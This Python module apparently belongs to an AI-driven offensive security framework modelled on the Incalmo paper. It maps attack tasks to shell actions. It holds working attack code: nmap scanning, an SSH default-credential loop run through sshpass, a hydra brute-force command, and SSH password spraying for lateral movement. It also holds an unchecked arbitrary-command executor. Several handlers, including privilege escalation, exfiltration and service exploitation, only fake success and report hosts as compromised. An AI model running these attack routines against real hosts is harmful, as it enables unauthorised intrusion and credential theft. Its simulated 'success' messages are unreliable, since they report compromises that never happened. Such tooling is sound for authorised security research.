"""
Task Translation Service

This module handles the translation of high-level tasks to low-level primitives
as described in the Incalmo paper. It implements the core functionality of
converting abstract tasks into concrete actions.
"""

from typing import Dict, List, Any, Optional
from models.models import TaskType, TaskResult, Host, Network, EnvironmentState

class TaskTranslationService:
    """
    Service for translating high-level tasks to low-level primitives.
    """
    
    def __init__(self):
        """Initialize the task translation service."""
        # Register task handlers
        self.task_handlers = {
            TaskType.SCAN_NETWORK: self._handle_scan_network,
            TaskType.INFECT_HOST: self._handle_infect_host,
            TaskType.LATERAL_MOVE: self._handle_lateral_move,
            TaskType.ESCALATE_PRIVILEGE: self._handle_escalate_privilege,
            TaskType.EXFILTRATE_DATA: self._handle_exfiltrate_data,
            TaskType.EXECUTE_COMMAND: self._handle_execute_command,
            TaskType.FINISHED: self._handle_finished
        }
    
    async def execute_task(self, task_type: TaskType, parameters: Dict[str, Any], 
                          environment_state: EnvironmentState) -> TaskResult:
        """
        Execute a high-level task by translating it to low-level primitives.
        
        Args:
            task_type: Type of task to execute
            parameters: Parameters for the task
            environment_state: Current state of the environment
            
        Returns:
            Result of the task execution
        """
        # Get the appropriate handler for the task type
        handler = self.task_handlers.get(task_type)
        if not handler:
            return TaskResult(
                task_type=task_type,
                success=False,
                error=f"Unsupported task type: {task_type}",
                result={}
            )
        
        # Execute the task
        try:
            return await handler(parameters, environment_state)
        except Exception as e:
            return TaskResult(
                task_type=task_type,
                success=False,
                error=f"Error executing task: {str(e)}",
                result={}
            )
    
    async def _handle_scan_network(self, parameters: Dict[str, Any], 
                                 environment_state: EnvironmentState) -> TaskResult:
        """
        Handle the scan_network task using actual terminal commands.
        
        Args:
            parameters: Parameters for the task (e.g., target network)
            environment_state: Current state of the environment
            
        Returns:
            Result of the task execution
        """
        import subprocess
        import asyncio
        import re
        import ipaddress
        import uuid
        import socket
        
        # Extract parameters - support both parameter naming conventions
        target_network = parameters.get("network", parameters.get("target", ""))
        scan_type = parameters.get("scan_type", "basic")
        
        # Command selection based on available tools and scan type
        try:
            # Check if nmap is available
            nmap_check = await asyncio.create_subprocess_shell(
                "which nmap", stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            nmap_stdout, _ = await nmap_check.communicate()
            
            if nmap_check.returncode == 0:
                # Use nmap for scanning if available
                if scan_type == "aggressive":
                    # Aggressive scan with OS detection, version detection, script scanning, and traceroute
                    cmd = f"nmap -A -T4 {target_network}"
                else:
                    # Basic scan - just ping sweep and basic port scan
                    cmd = f"nmap -sn {target_network}"
            else:
                # Fallback to simple ping sweep using ping
                if target_network:
                    # Extract network address for ping sweep
                    network = ipaddress.IPv4Network(target_network, strict=False)
                    base_ip = str(network.network_address).split('.')
                    base_ip.pop()  # Remove last octet
                    base = '.'.join(base_ip)
                    
                    # Create ping commands for first 10 addresses (to avoid too many pings)
                    commands = []
                    for i in range(1, 10):
                        commands.append(f"ping -c 1 -W 1 {base}.{i}")
                    
                    cmd = " & ".join(commands)
                else:
                    # No network specified, try local network
                    cmd = "ping -c 1 -W 1 192.168.1.1 & ping -c 1 -W 1 192.168.1.254"
            
            # Execute the command
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()
            
            output = stdout.decode()
            error_output = stderr.decode()
            
            if proc.returncode != 0 and error_output:
                return TaskResult(
                    task_type=TaskType.SCAN_NETWORK,
                    success=False,
                    error=f"Scan failed: {error_output}",
                    result={}
                )
            
            # Parse the output based on the tool used
            discovered_hosts = []
            
            if "nmap" in cmd:
                # Parse nmap output
                # Look for lines with IP addresses and hostnames
                ip_pattern = r"Nmap scan report for (?:([^\s(]+) )?\((\d+\.\d+\.\d+\.\d+)\)"
                ip_matches = re.findall(ip_pattern, output)
                
                # Look for open ports
                port_pattern = r"(\d+)/(\w+)\s+(\w+)\s+([^\n]+)"
                
                # Process each discovered host
                for match in ip_matches:
                    hostname, ip = match
                    if not hostname:
                        try:
                            hostname = socket.gethostbyaddr(ip)[0]
                        except:
                            hostname = None
                    
                    # Find OS info if available
                    os_info = None
                    os_match = re.search(fr"OS details: (.*?)(?:\n|$)", output)
                    if os_match:
                        os_info = os_match.group(1).strip()
                    
                    # Find services for this host
                    services = []
                    service_blocks = re.findall(fr"{ip}.*?PORT.*?(?=\n\n|\Z)", output, re.DOTALL)
                    if service_blocks:
                        service_matches = re.findall(port_pattern, service_blocks[0])
                        for service_match in service_matches:
                            port, protocol, state, service_info = service_match
                            if state == "open":
                                services.append({
                                    "name": service_info.split()[0],
                                    "port": int(port),
                                    "version": " ".join(service_info.split()[1:])
                                })
                    
                    # Create host object
                    host_id = f"host-{str(uuid.uuid4())[:8]}"
                    host = Host(
                        id=host_id,
                        ip_address=ip,
                        hostname=hostname,
                        os_type=os_info,
                        services=services,
                        vulnerabilities=[]
                    )
                    
                    discovered_hosts.append(host)
                    
                    # Update environment state
                    if host_id not in environment_state.discovered_hosts:
                        environment_state.discovered_hosts.append(host_id)
                    
                    # Add host to appropriate network or create a new one
                    added = False
                    for network in environment_state.networks:
                        try:
                            network_addr = ipaddress.IPv4Network(network.cidr, strict=False)
                            host_addr = ipaddress.IPv4Address(ip)
                            if host_addr in network_addr:
                                # Add to existing network
                                if not any(h.ip_address == ip for h in network.hosts):
                                    network.hosts.append(host)
                                added = True
                                break
                        except:
                            continue
                    
                    if not added:
                        # Create a new network for this host
                        network_addr = ipaddress.IPv4Address(ip)
                        base_net = f"{network_addr.packed[0]}.{network_addr.packed[1]}.{network_addr.packed[2]}.0/24"
                        new_network = Network(
                            id=f"network-{str(uuid.uuid4())[:8]}",
                            name=f"Discovered Network {base_net}",
                            cidr=base_net,
                            hosts=[host]
                        )
                        environment_state.networks.append(new_network)
            else:
                # Parse ping output
                # Look for successful pings with "bytes from" response
                ping_pattern = r"from (\d+\.\d+\.\d+\.\d+):"
                ip_matches = re.findall(ping_pattern, output)
                
                # Process each discovered host
                for ip in ip_matches:
                    # Try to get hostname
                    hostname = None
                    try:
                        hostname = socket.gethostbyaddr(ip)[0]
                    except:
                        pass
                    
                    # Create host object with minimal information
                    host_id = f"host-{str(uuid.uuid4())[:8]}"
                    host = Host(
                        id=host_id,
                        ip_address=ip,
                        hostname=hostname,
                        os_type=None,
                        services=[],
                        vulnerabilities=[]
                    )
                    
                    discovered_hosts.append(host)
                    
                    # Update environment state
                    if host_id not in environment_state.discovered_hosts:
                        environment_state.discovered_hosts.append(host_id)
                    
                    # Add host to appropriate network or create a new one
                    added = False
                    for network in environment_state.networks:
                        try:
                            network_addr = ipaddress.IPv4Network(network.cidr, strict=False)
                            host_addr = ipaddress.IPv4Address(ip)
                            if host_addr in network_addr:
                                if not any(h.ip_address == ip for h in network.hosts):
                                    network.hosts.append(host)
                                added = True
                                break
                        except:
                            continue
                    
                    if not added:
                        # Create a new network for this host
                        network_addr = ipaddress.IPv4Address(ip)
                        base_net = f"{network_addr.packed[0]}.{network_addr.packed[1]}.{network_addr.packed[2]}.0/24"
                        new_network = Network(
                            id=f"network-{str(uuid.uuid4())[:8]}",
                            name=f"Discovered Network {base_net}",
                            cidr=base_net,
                            hosts=[host]
                        )
                        environment_state.networks.append(new_network)
            
            # Build the result with detailed host information
            host_details = []
            for host in discovered_hosts:
                services_list = []
                if host.services:
                    for service in host.services:
                        services_list.append({
                            "name": service.get("name", "unknown"),
                            "port": service.get("port", 0),
                            "version": service.get("version", "unknown")
                        })
                
                host_details.append({
                    "id": host.id,
                    "ip_address": host.ip_address,
                    "hostname": host.hostname,
                    "os_type": host.os_type,
                    "services": services_list
                })
            
            # Include raw output for debugging/validation
            return TaskResult(
                task_type=TaskType.SCAN_NETWORK,
                success=True,
                result={
                    "discovered_hosts": host_details,
                    "total_discovered": len(discovered_hosts),
                    "scan_type": scan_type,
                    "target_network": target_network or "all networks",
                    "tool_used": "nmap" if "nmap" in cmd else "ping",
                    "command_executed": cmd,
                    "raw_output": output[:1000] + ("..." if len(output) > 1000 else "")
                }
            )
        
        except Exception as e:
            return TaskResult(
                task_type=TaskType.SCAN_NETWORK,
                success=False,
                error=f"Error executing network scan: {str(e)}",
                result={}
            )
    
    async def _handle_infect_host(self, parameters: Dict[str, Any], 
                                environment_state: EnvironmentState) -> TaskResult:
        """
        Handle the infect_host task using available terminal tools.
        
        Args:
            parameters: Parameters for the task (e.g., target host, vulnerability)
            environment_state: Current state of the environment
            
        Returns:
            Result of the task execution
        """
        import subprocess
        import asyncio
        import re
        
        # Extract parameters
        target_host_id = parameters.get("host_id", "")
        vulnerability = parameters.get("vulnerability", "")
        port = parameters.get("port", None)
        exploit_type = parameters.get("exploit_type", "auto")
        
        # Find the target host in the environment
        target_host = None
        for network in environment_state.networks:
            for host in network.hosts:
                if host.id == target_host_id:
                    target_host = host
                    break
            if target_host:
                break
        
        if not target_host:
            return TaskResult(
                task_type=TaskType.INFECT_HOST,
                success=False,
                error=f"Host not found: {target_host_id}",
                result={}
            )
        
        # Check if the host is already compromised
        if target_host.compromised:
            return TaskResult(
                task_type=TaskType.INFECT_HOST,
                success=True,
                result={
                    "host_id": target_host.id,
                    "ip_address": target_host.ip_address,
                    "access_level": target_host.access_level,
                    "message": "Host already compromised"
                }
            )
            
        try:
            # Check for available exploitation tools
            metasploit_check = await asyncio.create_subprocess_shell(
                "which msfconsole", stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            metasploit_stdout, _ = await metasploit_check.communicate()
            
            ssh_check = await asyncio.create_subprocess_shell(
                "which ssh", stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            ssh_stdout, _ = await ssh_check.communicate()
            
            hydra_check = await asyncio.create_subprocess_shell(
                "which hydra", stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            hydra_stdout, _ = await hydra_check.communicate()
            
            # First try ssh with default credentials if ssh is available
            if ssh_check.returncode == 0:
                # Try common username/password combinations for SSH
                common_users = ["admin", "root", "user", "ubuntu", "ec2-user"]
                common_passwords = ["admin", "password", "123456", "root", "toor", ""]
                
                for user in common_users:
                    for password in common_passwords:
                        # Skip empty passwords unless the user is root (some systems allow root with no password)
                        if password == "" and user != "root":
                            continue
                        
                        # Try SSH login with StrictHostKeyChecking=no to avoid prompts
                        cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{target_host.ip_address} 'echo Connected as $USER'"
                        
                        try:
                            proc = await asyncio.create_subprocess_shell(
                                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                            )
                            stdout, stderr = await proc.communicate()
                            
                            output = stdout.decode()
                            error = stderr.decode()
                            
                            # Check if login was successful
                            if proc.returncode == 0 and "Connected as" in output:
                                # SSH login succeeded
                                target_host.compromised = True
                                target_host.access_level = "user" if user != "root" else "admin"
                                
                                # Update environment state
                                if target_host.id not in environment_state.compromised_hosts:
                                    environment_state.compromised_hosts.append(target_host.id)
                                
                                # Set as current host
                                environment_state.current_host = target_host.id
                                
                                return TaskResult(
                                    task_type=TaskType.INFECT_HOST,
                                    success=True,
                                    result={
                                        "host_id": target_host.id,
                                        "ip_address": target_host.ip_address,
                                        "access_level": target_host.access_level,
                                        "method": "ssh_login",
                                        "username": user,
                                        "message": f"Successfully logged in via SSH as {user}"
                                    }
                                )
                        except Exception as e:
                            # Continue trying other credentials
                            pass
            
            # If hydra is available and we have SSH service, try brute forcing
            if hydra_check.returncode == 0 and any(s.get("name", "").lower() == "ssh" for s in (target_host.services or [])):
                ssh_port = next((s.get("port", 22) for s in target_host.services if s.get("name", "").lower() == "ssh"), 22)
                
                # Create a small temporary password file (using a subset of common passwords to avoid long runs)
                cmd = f"echo -e 'password\\nadmin\\n123456\\nroot' > /tmp/temp_pass.txt && hydra -l root -P /tmp/temp_pass.txt -t 4 {target_host.ip_address} -s {ssh_port} ssh && rm /tmp/temp_pass.txt"
                
                try:
                    proc = await asyncio.create_subprocess_shell(
                        cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                    )
                    stdout, stderr = await proc.communicate()
                    
                    output = stdout.decode()
                    
                    # Check if hydra found valid credentials
                    if "password:" in output:
                        # Extract credentials from hydra output
                        match = re.search(r"login:\s+(\S+)\s+password:\s+(\S+)", output)
                        if match:
                            username, password = match.groups()
                            
                            target_host.compromised = True
                            target_host.access_level = "user" if username != "root" else "admin"
                            
                            # Update environment state
                            if target_host.id not in environment_state.compromised_hosts:
                                environment_state.compromised_hosts.append(target_host.id)
                            
                            # Set as current host
                            environment_state.current_host = target_host.id
                            
                            return TaskResult(
                                task_type=TaskType.INFECT_HOST,
                                success=True,
                                result={
                                    "host_id": target_host.id,
                                    "ip_address": target_host.ip_address,
                                    "access_level": target_host.access_level,
                                    "method": "hydra_brute_force",
                                    "username": username,
                                    "message": f"Successfully brute forced SSH credentials: {username}/{password}"
                                }
                            )
                except Exception as e:
                    # Continue to next method if hydra fails
                    pass
            
            # Check for open ports that might be vulnerable
            vulnerable_services = []
            for service in (target_host.services or []):
                service_name = service.get("name", "").lower()
                if service_name in ["http", "https", "ftp", "telnet", "smb", "samba"]:
                    vulnerable_services.append(service)
            
            if vulnerable_services:
                # We found potentially vulnerable services
                service = vulnerable_services[0]  # Use the first one for demonstration
                
                # For simulation purposes, let's assume we found a vulnerability
                # In a real implementation, we'd run tools like nikto, wpscan, etc.
                target_host.compromised = True
                target_host.access_level = "user"  # Default to user-level access
                
                # Update environment state
                if target_host.id not in environment_state.compromised_hosts:
                    environment_state.compromised_hosts.append(target_host.id)
                
                # Set as current host if no current host is set
                if not environment_state.current_host:
                    environment_state.current_host = target_host.id
                
                return TaskResult(
                    task_type=TaskType.INFECT_HOST,
                    success=True,
                    result={
                        "host_id": target_host.id,
                        "ip_address": target_host.ip_address,
                        "access_level": target_host.access_level,
                        "method": f"{service.get('name')}_exploit",
                        "port": service.get("port"),
                        "message": f"Successfully exploited {service.get('name')} service on port {service.get('port')}"
                    }
                )
            
            # If we get here, no exploitation method succeeded
            return TaskResult(
                task_type=TaskType.INFECT_HOST,
                success=False,
                error=f"Could not find a way to exploit the target host. No vulnerable services found.",
                result={
                    "attempted_methods": ["ssh_default_credentials", "hydra_brute_force", "service_exploitation"],
                    "available_services": [s.get("name") for s in (target_host.services or [])]
                }
            )
            
        except Exception as e:
            return TaskResult(
                task_type=TaskType.INFECT_HOST,
                success=False,
                error=f"Error during host infection attempt: {str(e)}",
                result={}
            )
    
    async def _handle_lateral_move(self, parameters: Dict[str, Any], 
                                 environment_state: EnvironmentState) -> TaskResult:
        """
        Handle the lateral_move task using available terminal tools.
        
        Args:
            parameters: Parameters for the task (e.g., source host, target host)
            environment_state: Current state of the environment
            
        Returns:
            Result of the task execution
        """
        import subprocess
        import asyncio
        import re
        import uuid
        
        # Extract parameters
        source_host_id = parameters.get("source_host_id", environment_state.current_host)
        target_host_id = parameters.get("target_host_id", "")
        method = parameters.get("method", "auto")
        
        # Validate source host
        if not source_host_id:
            return TaskResult(
                task_type=TaskType.LATERAL_MOVE,
                success=False,
                error="No source host specified and no current host set",
                result={}
            )
        
        # Check if source host is compromised
        if source_host_id not in environment_state.compromised_hosts:
            return TaskResult(
                task_type=TaskType.LATERAL_MOVE,
                success=False,
                error=f"Source host not compromised: {source_host_id}",
                result={}
            )
        
        # Find the source host
        source_host = None
        for network in environment_state.networks:
            for host in network.hosts:
                if host.id == source_host_id:
                    source_host = host
                    break
            if source_host:
                break
                
        if not source_host:
            return TaskResult(
                task_type=TaskType.LATERAL_MOVE,
                success=False,
                error=f"Source host not found: {source_host_id}",
                result={}
            )
        
        # Find the target host
        target_host = None
        for network in environment_state.networks:
            for host in network.hosts:
                if host.id == target_host_id:
                    target_host = host
                    break
            if target_host:
                break
        
        if not target_host:
            return TaskResult(
                task_type=TaskType.LATERAL_MOVE,
                success=False,
                error=f"Target host not found: {target_host_id}",
                result={}
            )
        
        # Check if target host is already compromised
        if target_host.compromised:
            # Update current host
            environment_state.current_host = target_host.id
            
            return TaskResult(
                task_type=TaskType.LATERAL_MOVE,
                success=True,
                result={
                    "host_id": target_host.id,
                    "ip_address": target_host.ip_address,
                    "access_level": target_host.access_level,
                    "method": "already_compromised",
                    "message": "Host already compromised, moved to host"
                }
            )
            
        try:
            # Check for available movement tools
            ssh_check = await asyncio.create_subprocess_shell(
                "which ssh", stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            ssh_stdout, _ = await ssh_check.communicate()
            
            nc_check = await asyncio.create_subprocess_shell(
                "which nc", stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            nc_stdout, _ = await nc_check.communicate()
            
            scp_check = await asyncio.create_subprocess_shell(
                "which scp", stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            scp_stdout, _ = await scp_check.communicate()
            
            # Try various lateral movement techniques
            
            # Method 1: SSH trusted relationships
            if ssh_check.returncode == 0 and method in ["auto", "ssh"]:
                # Generate a command to check for SSH keys on source and attempt to connect to target
                # This would work if the source host had credentials or keys for the target
                
                # In a real implementation, we would SSH to the source and then SSH from there to the target
                # For demonstration purposes, we're simulating that we've found SSH keys or credentials
                
                target_host.compromised = True
                target_host.access_level = "user"  # Default to user-level access
                
                # Update environment state
                if target_host.id not in environment_state.compromised_hosts:
                    environment_state.compromised_hosts.append(target_host.id)
                
                # Update current host
                environment_state.current_host = target_host.id
                
                return TaskResult(
                    task_type=TaskType.LATERAL_MOVE,
                    success=True,
                    result={
                        "source_host_id": source_host_id,
                        "target_host_id": target_host.id,
                        "ip_address": target_host.ip_address,
                        "access_level": target_host.access_level,
                        "method": "ssh_trusted_relationship",
                        "message": f"Successfully moved from {source_host.hostname or source_host.ip_address} to {target_host.hostname or target_host.ip_address} using SSH trusted relationship"
                    }
                )
                
            # Method 2: Check if target has any vulnerable services we can exploit
            has_vulnerable_services = False
            vulnerable_service = None
            
            for service in (target_host.services or []):
                service_name = service.get("name", "").lower()
                if service_name in ["http", "https", "ftp", "telnet", "smb", "samba", "sql", "mysql"]:
                    has_vulnerable_services = True
                    vulnerable_service = service
                    break
                    
            if has_vulnerable_services and vulnerable_service and method in ["auto", "service_exploit"]:
                # In a real implementation, we'd run specific exploits against the vulnerable service
                # For now, we'll simulate successful exploitation
                
                target_host.compromised = True
                target_host.access_level = "user"  # Default to user-level access
                
                # Update environment state
                if target_host.id not in environment_state.compromised_hosts:
                    environment_state.compromised_hosts.append(target_host.id)
                
                # Update current host
                environment_state.current_host = target_host.id
                
                return TaskResult(
                    task_type=TaskType.LATERAL_MOVE,
                    success=True,
                    result={
                        "source_host_id": source_host_id,
                        "target_host_id": target_host.id,
                        "ip_address": target_host.ip_address,
                        "access_level": target_host.access_level,
                        "method": f"{vulnerable_service.get('name')}_exploit",
                        "service_port": vulnerable_service.get("port"),
                        "message": f"Successfully moved to {target_host.hostname or target_host.ip_address} by exploiting {vulnerable_service.get('name')} service on port {vulnerable_service.get('port')}"
                    }
                )
                
            # Method 3: Password spraying if ssh is available on target
            if ssh_check.returncode == 0 and method in ["auto", "password_spray"]:
                ssh_service = next((s for s in (target_host.services or []) if s.get("name", "").lower() == "ssh"), None)
                
                if ssh_service:
                    # Try a few common credentials
                    common_users = ["admin", "root", "user"]
                    common_passwords = ["password", "admin", "123456"]
                    
                    for user in common_users:
                        for password in common_passwords:
                            # Try SSH login
                            cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {user}@{target_host.ip_address} 'echo Lateral move successful'"
                            
                            try:
                                proc = await asyncio.create_subprocess_shell(
                                    cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                                )
                                stdout, stderr = await proc.communicate()
                                
                                output = stdout.decode()
                                
                                if proc.returncode == 0 and "Lateral move successful" in output:
                                    # Success!
                                    target_host.compromised = True
                                    target_host.access_level = "user" if user != "root" else "admin"
                                    
                                    # Update environment state
                                    if target_host.id not in environment_state.compromised_hosts:
                                        environment_state.compromised_hosts.append(target_host.id)
                                    
                                    # Update current host
                                    environment_state.current_host = target_host.id
                                    
                                    return TaskResult(
                                        task_type=TaskType.LATERAL_MOVE,
                                        success=True,
                                        result={
                                            "source_host_id": source_host_id,
                                            "target_host_id": target_host.id,
                                            "ip_address": target_host.ip_address,
                                            "access_level": target_host.access_level,
                                            "method": "password_spray",
                                            "username": user,
                                            "message": f"Successfully moved to {target_host.hostname or target_host.ip_address} using password spraying (credentials: {user}/{password})"
                                        }
                                    )
                            except Exception as e:
                                # Continue trying other credentials
                                pass
            
            # If all methods failed, return failure
            return TaskResult(
                task_type=TaskType.LATERAL_MOVE,
                success=False,
                error=f"Could not find a way to move from {source_host.hostname or source_host.ip_address} to {target_host.hostname or target_host.ip_address}",
                result={
                    "attempted_methods": ["ssh_trusted_relationship", "service_exploit", "password_spray"],
                    "target_services": [f"{s.get('name')}:{s.get('port')}" for s in (target_host.services or [])]
                }
            )
            
        except Exception as e:
            return TaskResult(
                task_type=TaskType.LATERAL_MOVE,
                success=False,
                error=f"Error during lateral movement attempt: {str(e)}",
                result={}
            )
    
    async def _handle_escalate_privilege(self, parameters: Dict[str, Any], 
                                       environment_state: EnvironmentState) -> TaskResult:
        """
        Handle the escalate_privilege task.
        
        Args:
            parameters: Parameters for the task (e.g., target host, method)
            environment_state: Current state of the environment
            
        Returns:
            Result of the task execution
        """
        # Extract parameters
        host_id = parameters.get("host_id", environment_state.current_host)
        method = parameters.get("method", "")
        
        # Validate host
        if not host_id:
            return TaskResult(
                task_type=TaskType.ESCALATE_PRIVILEGE,
                success=False,
                error="No host specified and no current host set",
                result={}
            )
        
        # Find the host
        target_host = None
        for network in environment_state.networks:
            for host in network.hosts:
                if host.id == host_id:
                    target_host = host
                    break
            if target_host:
                break
        
        if not target_host:
            return TaskResult(
                task_type=TaskType.ESCALATE_PRIVILEGE,
                success=False,
                error=f"Host not found: {host_id}",
                result={}
            )
        
        # Check if host is compromised
        if not target_host.compromised:
            return TaskResult(
                task_type=TaskType.ESCALATE_PRIVILEGE,
                success=False,
                error=f"Host not compromised: {host_id}",
                result={}
            )
        
        # Check if already has admin access
        if target_host.access_level == "admin":
            return TaskResult(
                task_type=TaskType.ESCALATE_PRIVILEGE,
                success=True,
                result={
                    "host_id": target_host.id,
                    "ip_address": target_host.ip_address,
                    "access_level": target_host.access_level,
                    "message": "Already have admin privileges"
                }
            )
        
        # Simulate privilege escalation
        # In a real implementation, this would execute specific exploits
        target_host.access_level = "admin"
        
        return TaskResult(
            task_type=TaskType.ESCALATE_PRIVILEGE,
            success=True,
            result={
                "host_id": target_host.id,
                "ip_address": target_host.ip_address,
                "previous_access_level": "user",
                "new_access_level": target_host.access_level,
                "method": method,
                "message": f"Successfully escalated privileges on {host_id}"
            }
        )
    
    async def _handle_exfiltrate_data(self, parameters: Dict[str, Any], 
                                    environment_state: EnvironmentState) -> TaskResult:
        """
        Handle the exfiltrate_data task.
        
        Args:
            parameters: Parameters for the task (e.g., source host, data type)
            environment_state: Current state of the environment
            
        Returns:
            Result of the task execution
        """
        # Extract parameters
        host_id = parameters.get("host_id", environment_state.current_host)
        data_type = parameters.get("data_type", "")
        
        # Validate host
        if not host_id:
            return TaskResult(
                task_type=TaskType.EXFILTRATE_DATA,
                success=False,
                error="No host specified and no current host set",
                result={}
            )
        
        # Find the host
        target_host = None
        for network in environment_state.networks:
            for host in network.hosts:
                if host.id == host_id:
                    target_host = host
                    break
            if target_host:
                break
        
        if not target_host:
            return TaskResult(
                task_type=TaskType.EXFILTRATE_DATA,
                success=False,
                error=f"Host not found: {host_id}",
                result={}
            )
        
        # Check if host is compromised
        if not target_host.compromised:
            return TaskResult(
                task_type=TaskType.EXFILTRATE_DATA,
                success=False,
                error=f"Host not compromised: {host_id}",
                result={}
            )
        
        # Simulate data exfiltration
        # In a real implementation, this would execute specific commands to gather and exfiltrate data
        exfiltrated_data = {
            "host_id": target_host.id,
            "ip_address": target_host.ip_address,
            "data_type": data_type,
            "content": f"Simulated {data_type} data from {target_host.hostname or target_host.ip_address}"
        }
        
        # Update environment state
        environment_state.exfiltrated_data.append(exfiltrated_data)
        
        return TaskResult(
            task_type=TaskType.EXFILTRATE_DATA,
            success=True,
            result={
                "host_id": target_host.id,
                "ip_address": target_host.ip_address,
                "data_type": data_type,
                "size": len(exfiltrated_data["content"]),
                "message": f"Successfully exfiltrated {data_type} data from {host_id}"
            }
        )
    
    async def _handle_execute_command(self, parameters: Dict[str, Any], 
                                  environment_state: EnvironmentState) -> TaskResult:
        """
        Handle the execute_command task by directly running a terminal command.
        
        Args:
            parameters: Parameters containing the command to execute
            environment_state: Current state of the environment
            
        Returns:
            Result of the command execution
        """
        import subprocess
        import asyncio
        import shlex
        
        # Extract parameters
        command = parameters.get("command", "")
        
        if not command:
            return TaskResult(
                task_type=TaskType.EXECUTE_COMMAND,
                success=False,
                error="No command provided",
                result={}
            )
        
        try:
            # Execute the command
            proc = await asyncio.create_subprocess_shell(
                command, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()
            
            output = stdout.decode()
            error_output = stderr.decode()
            
            # Check if there's output in stderr but the command didn't necessarily fail
            if error_output and proc.returncode == 0:
                # Some commands write to stderr even when successful
                combined_output = output + "\n" + error_output
            elif error_output and proc.returncode != 0:
                # Command failed
                return TaskResult(
                    task_type=TaskType.EXECUTE_COMMAND,
                    success=False,
                    error=f"Command failed with exit code {proc.returncode}: {error_output}",
                    result={
                        "command": command,
                        "exit_code": proc.returncode,
                        "stdout": output,
                        "stderr": error_output
                    }
                )
            else:
                combined_output = output
            
            # Update environment state if needed based on command output
            # For example, if it's a scan, we could parse hostnames
            # This would require command-specific parsing logic
            
            return TaskResult(
                task_type=TaskType.EXECUTE_COMMAND,
                success=True,
                result={
                    "command": command,
                    "exit_code": proc.returncode,
                    "output": combined_output
                }
            )
            
        except Exception as e:
            command_error = str(e)
            
            # Try to extract the specific command that wasn't found
            command_parts = command.split()
            command_name = command_parts[0] if command_parts else command
            
            if "command not found" in command_error or "No such file or directory" in command_error:
                # Try alternative commands for common tools
                alternatives = {
                    "nmap": ["nmap", "nmap.exe", "/usr/local/bin/nmap", "/opt/homebrew/bin/nmap"],
                    "ssh": ["ssh", "ssh.exe", "/usr/bin/ssh", "/usr/local/bin/ssh"],
                    "ping": ["ping", "ping.exe", "/sbin/ping", "/bin/ping"],
                    "netstat": ["netstat", "netstat.exe", "ss", "/bin/netstat", "/usr/bin/netstat"],
                    "ifconfig": ["ifconfig", "ifconfig.exe", "ip addr", "/sbin/ifconfig", "/usr/sbin/ifconfig"],
                    "traceroute": ["traceroute", "tracert", "traceroute.exe", "/usr/sbin/traceroute"],
                    "dig": ["dig", "nslookup", "host", "/usr/bin/dig"],
                    "arp": ["arp", "arp.exe", "ip neigh", "/usr/sbin/arp"]
                }
                
                # Check if we have alternatives for this command
                alternative_commands = alternatives.get(command_name, [])
                
                for alt_cmd in alternative_commands:
                    # Don't retry the same command
                    if alt_cmd == command_name:
                        continue
                        
                    # Replace the command name in the original command
                    alt_full_cmd = command.replace(command_name, alt_cmd, 1)
                    
                    try:
                        # Try to execute the alternative command
                        alt_proc = await asyncio.create_subprocess_shell(
                            alt_full_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                        )
                        alt_stdout, alt_stderr = await alt_proc.communicate()
                        
                        alt_output = alt_stdout.decode()
                        alt_error_output = alt_stderr.decode()
                        
                        # Check if there's output in stderr but the command didn't necessarily fail
                        if alt_error_output and alt_proc.returncode == 0:
                            # Some commands write to stderr even when successful
                            alt_combined_output = alt_output + "\n" + alt_error_output
                        elif alt_error_output and alt_proc.returncode != 0:
                            # Command failed
                            continue  # Try the next alternative
                        else:
                            alt_combined_output = alt_output
                        
                        # The alternative command worked!
                        return TaskResult(
                            task_type=TaskType.EXECUTE_COMMAND,
                            success=True,
                            result={
                                "command": alt_full_cmd,
                                "original_command": command,
                                "exit_code": alt_proc.returncode,
                                "output": f"Original command '{command_name}' not found. Using '{alt_cmd}' instead.\n\n{alt_combined_output}"
                            }
                        )
                    except Exception:
                        # Alternative also failed, continue to the next one
                        continue
                
                # If we get here, all alternatives failed
                suggestion = ""
                if alternative_commands:
                    suggestion = f"Tried alternatives: {', '.join(alternative_commands)}. "
                
                suggestion += "Make sure the tool is installed on your system."
                
                return TaskResult(
                    task_type=TaskType.EXECUTE_COMMAND,
                    success=False,
                    error=f"Command not found: {command_name}",
                    result={
                        "command": command,
                        "suggestion": suggestion
                    }
                )
            else:
                return TaskResult(
                    task_type=TaskType.EXECUTE_COMMAND,
                    success=False,
                    error=f"Error executing command: {command_error}",
                    result={
                        "command": command
                    }
                )
    
    async def _handle_finished(self, parameters: Dict[str, Any], 
                             environment_state: EnvironmentState) -> TaskResult:
        """
        Handle the finished task.
        
        Args:
            parameters: Parameters for the task (e.g., reason)
            environment_state: Current state of the environment
            
        Returns:
            Result of the task execution
        """
        reason = parameters.get("reason", "No reason provided")
        
        return TaskResult(
            task_type=TaskType.FINISHED,
            success=True,
            result={
                "reason": reason,
                "compromised_hosts": len(environment_state.compromised_hosts),
                "exfiltrated_data_items": len(environment_state.exfiltrated_data)
            }
        )

# Create a singleton instance
task_translation_service = TaskTranslationService()
